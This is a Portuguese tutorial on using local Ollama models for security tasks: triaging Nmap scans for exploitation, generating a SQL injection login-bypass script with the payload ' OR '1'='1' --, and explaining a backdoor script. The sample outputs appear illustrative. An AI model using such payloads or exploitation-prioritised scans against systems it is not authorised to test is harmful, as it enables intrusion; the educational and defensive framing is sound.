# IA Local com Ollama

> LLMs locais para segurança — dados nunca saem da sua máquina.

---

## O que é Ollama?

**Ollama** permite rodar modelos de LLM (Large Language Model) localmente no terminal. Para segurança, isso significa:
- Dados sensíveis (scans, hashes, logs) **nunca saem do seu computador**
- Sem custo de API (tokens)
- Funciona offline
- Privacidade total

## Instalação

```bash
# Instalar Ollama (Linux)
curl -fsSL https://ollama.com/install.sh | sh

# OUTPUT ESPERADO:
# >>> Installing ollama to /usr/local/bin...
# >>> Creating ollama user...
# >>> Creating ollama systemd service...
# >>> The Ollama API is now available at 127.0.0.1:11434.
# >>> Install complete. Run "ollama" to get started.

# Verificar instalação
ollama --version
# OUTPUT ESPERADO:
# ollama version is 0.3.12

# Verificar serviço
systemctl status ollama
# OUTPUT ESPERADO:
# ● ollama.service - Ollama Service
#      Loaded: loaded (/etc/systemd/system/ollama.service; enabled)
#      Active: active (running) since Thu 2026-09-10 10:00:00 UTC
```

## Modelos Recomendados para Segurança

| Modelo | Tamanho | RAM Mínima | Uso Principal |
|:-------|:--------|:-----------|:--------------|
| `llama3.2` | 3B | 4GB | Chat geral, explicações |
| `llama3.1:8b` | 8B | 8GB | Análise de código, exploits |
| `codellama:13b` | 13B | 16GB | Geração de código, scripts |
| `mistral` | 7B | 8GB | Raciocínio, análise |
| `deepseek-r1` | 14B | 16GB | Raciocínio avançado, CTF |
| `qwen2.5-coder:32b` | 32B | 32GB | Código complexo |

## Comandos Básicos

```bash
# Baixar um modelo
ollama pull llama3.2
# OUTPUT ESPERADO:
# pulling manifest
# pulling 6a0746a1ec1a... 100% ▕████████████████▏ 4.7 GB
# pulling 4fa551d4f938... 100% ▕████████████████▏  12 KB
# pulling 8ab4849b038c... 100% ▕████████████████▏   96 B
# pulling 577073ffcc6c... 100% ▕████████████████▏  510 B
# verifying sha256 digest
# writing manifest
# success

# Rodar um modelo (chat interativo)
ollama run llama3.2
# OUTPUT ESPERADO:
# >>> Send a message (/? for help)

# Listar modelos baixados
ollama ls
# OUTPUT ESPERADO:
# NAME                ID              SIZE      MODIFIED
# llama3.2:latest     a6f4c58ab5e8    4.7 GB    5 minutes ago

# Ver modelos rodando
ollama ps
# OUTPUT ESPERADO:
# NAME            ID              SIZE      PROCESSOR   UNTIL
# llama3.2:latest a6f4c58ab5e8    4.7 GB    100% GPU    4 minutes from now

# Parar um modelo
ollama stop llama3.2

# Remover um modelo
ollama rm llama3.2
```

## Uso na Prática — Analisar Scan do Nmap

```bash
# 1. Rodar scan e salvar em arquivo
nmap -sV -oN scan.txt 192.168.1.1

# 2. Alimentar com IA local
ollama run llama3.1:8b <<EOF
Analise este resultado de Nmap e identifique:
1. Serviços vulneráveis
2. Versões desatualizadas
3. Vetores de ataque possíveis
4. Prioridade de exploração

$(cat scan.txt)
EOF
# OUTPUT ESPERADO:
# Com base no scan Nmap fornecido, identifico os seguintes pontos:
#
# 1. **Serviços Vulneráveis:**
#    - SSH (porta 22): OpenSSH 7.6p1 — versão desatualizada
#    - HTTP (porta 80): Apache 2.4.29 — vulnerável a CVE-2021-41773
#
# 2. **Versões Desatualizadas:**
#    - OpenSSH 7.6p1 (2017) — deve ser 9.x
#    - Apache 2.4.29 (2017) — deve ser 2.4.58+
#
# 3. **Vetores de Ataque:**
#    - Path traversal no Apache 2.4.29 (CVE-2021-41773)
#    - Brute force SSH (versão antiga pode ter weakness)
#
# 4. **Prioridade:**
#    1. Apache CVE-2021-41773 (crítico)
#    2. SSH brute force (alto)
```

## Uso na Prática — Gerar Payloads

```bash
ollama run codellama:13b <<EOF
Gere um payload em Python para explorar SQL Injection no campo de login 
de um formulário HTML. Use requests e bs4. Inclua tratamento de erros.
EOF
# OUTPUT ESPERADO:
# import requests
# from bs4 import BeautifulSoup
#
# def sqli_payload(url):
#     payload = "' OR '1'='1' --"
#     try:
#         response = requests.get(url, params={"username": payload})
#         soup = BeautifulSoup(response.text, 'html.parser')
#         if "Welcome" in response.text:
#             print("[+] SQL Injection funcionou!")
#             return True
#     except requests.exceptions.RequestException as e:
#         print(f"[-] Erro: {e}")
#     return False
```

## Uso na Prática — Analisar Malware

```bash
# Analisar um script suspeito
ollama run deepseek-r1 <<EOF
Analise este script bash e identifique se é malicioso. 
Se for, explique o que faz passo a passo:

$(cat script_suspeito.sh)
EOF
# OUTPUT ESPERADO:
# Este script é MALICIOSO. Aqui está a análise:
#
# 1. Linha 3: Cria um reverse shell em /tmp/.backdoor
# 2. Linha 7: Adiciona crontab para persistência
# 3. Linha 12: Exclui logs de autenticação
# 4. Linha 15: Abre porta 4444 para conexão do atacante
#
# Classificação: Backdoor com persistência e anti-forense
```
